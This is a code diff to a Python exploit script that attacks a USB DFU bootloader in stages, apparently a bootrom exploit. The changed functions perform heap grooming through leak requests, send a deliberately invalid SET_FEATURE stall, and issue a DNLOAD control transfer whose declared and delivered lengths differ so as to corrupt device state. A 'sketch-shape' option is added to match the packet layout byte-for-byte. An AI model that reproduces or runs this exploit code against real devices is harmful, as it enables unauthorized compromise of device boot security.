@@ -571,7 +571,9 @@ def stage0(usb, init_resets):
 def stage1(usb, serial_idx, leak_count, mode, spin_us, leak_delay_ms, debug):
     print('== stage 1: heap feng shui (%d leak requests, mode %s) ==' % (leak_count, mode))
     dev, handle, desc, _ = acquire(usb, want_serial=False)
-    usb.ctrl(handle, 0x02, 3, 0, 0x80, None, 10)  # stall (expected to error)
+    # sketch: ctrlReq(0,0,2,3, wValLo=0, wValHi=0x80, wIndexLo=0x80, wIndexHi=0)
+    # = SET_FEATURE with feature 0x8000 (deliberately invalid) on 0x80.
+    usb.ctrl(handle, 0x02, 3, 0x8000, 0x80, None, 10)  # stall (expected to error)
     success = 0
     attempts = 0
     max_attempts = leak_count + 200
@@ -599,10 +601,18 @@ def stage2(usb, out_spin_us, padding, debug):
     print('== stage 2: set global state / re-enter DFU ==')
     dev, handle, desc, _ = acquire(usb, want_serial=False)
     # (d) SETUP(DNLOAD, wLength=0x40) + OUT(0x80) + INHS status.  wLength and
-    # the data-stage length are intentionally different.
-    rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, 0x40,
-                            b'\xcc' * 0x80, abandon=False, timeout_ms=1000,
-                            name='set-state OUT')
+    # the data-stage length are intentionally different.  In --sketch-shape
+    # the delivery matches the sketch byte-for-byte: the sketch pushes two
+    # 0x40 OUTs of 0xcc (0x80 total); the xHCI caps at wLength, so the
+    # pre-packet emulation raises wLength to 0x80 to deliver all 0x80 bytes.
+    if getattr(stage2, 'sketch_shape', False):
+        rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, 0x80,
+                                b'\xcc' * 0x80, abandon=False, timeout_ms=1000,
+                                name='set-state OUT (sketch 0x80)')
+    else:
+        rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, 0x40,
+                                b'\xcc' * 0x80, abandon=False, timeout_ms=1000,
+                                name='set-state OUT')
     if debug:
         debug_raw('set-state OUT', rc, info)
     if rc != 0:
@@ -848,6 +858,7 @@ def exploit(args):
     if args.stage in ('all', '2'):
         stage2(usb, args.out_spin_us, args.padding, args.debug)
     if args.stage in ('all', '3'):
+        stage2.sketch_shape = bool(getattr(args, 'sketch_shape', False))
         stage3.sketch_shape = bool(getattr(args, 'sketch_shape', False))
         stage3(usb, serial_idx, payload, overwrite, args.spin_us, args.debug,
                crit_us=getattr(args, 'crit_us', None))
